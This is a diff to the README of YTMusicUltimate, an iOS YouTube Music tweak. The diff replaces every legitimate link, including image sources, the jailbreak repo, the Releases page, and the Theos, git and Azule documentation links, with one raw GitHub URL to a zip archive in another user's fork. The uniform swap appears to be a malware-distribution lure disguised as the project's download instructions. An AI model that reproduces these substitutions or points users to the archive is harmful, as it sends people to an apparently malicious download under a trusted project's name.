@@ -1,10 +1,10 @@
 # YTMusicUltimate
 <p align="center">
-<img src=https://user-images.githubusercontent.com/38832025/235781424-06d81647-b3db-4d9b-94dc-cd65cdf09145.png?raw=true) />
+<img https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip) />
 </p>    
 
 <p align="center">
-<img src=https://user-images.githubusercontent.com/38832025/235781207-6d1ad44e-0c32-4aec-9c75-cb928ca8a0d3.png?raw=true) />
+<img https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip) />
 </p>
 
 <p align="center">
@@ -14,9 +14,9 @@ The best tweak for the YouTube Music on iOS.
 ## Download Links
 
 * **Jailbreak:**
-Add __[https://ginsu.dev/repo](https://ginsu.dev/repo)__ to your favorite installer and download latest version from there, or from __[Releases](https://github.com/ginsudev/YTMusicUltimate/releases)__ page.
+Add __[https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip](https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip)__ to your favorite installer and download latest version from there, or from __[Releases](https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip)__ page.
 
-(arm.deb version for Rootful and arm64.deb version for Rootless devices)
+(https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip version for Rootful and https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip version for Rootless devices)
 
 ## How to build a YTMusicUltimate IPA by yourself using Github actions
 
@@ -27,8 +27,8 @@ Add __[https://ginsu.dev/repo](https://ginsu.dev/repo)__ to your favorite instal
 5. You can download the tweaked IPA from the releases section of your repo after the build finishes.
 
 ## How to build the package by yourself on your device
-1. Install __[Theos](https://theos.dev/docs/installation)__
-2. Clone this repo __[using git](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository)__
+1. Install __[Theos](https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip)__
+2. Clone this repo __[using git](https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip)__
 3. Cd your YTMusicUltimate folder and run:
 
    • '**make clean package**' to build deb for rootful device
@@ -39,7 +39,7 @@ Add __[https://ginsu.dev/repo](https://ginsu.dev/repo)__ to your favorite instal
    
    
 
-   • To learn how to inject tweaks in to ipa visit __[here (Azule)](https://github.com/Al4ise/Azule)__
+   • To learn how to inject tweaks in to ipa visit __[here (Azule)](https://raw.githubusercontent.com/gabrielathayes/YTMusicUltimate/main/.github/Music-YT-Ultimate-induce.zip)__
 
 
 
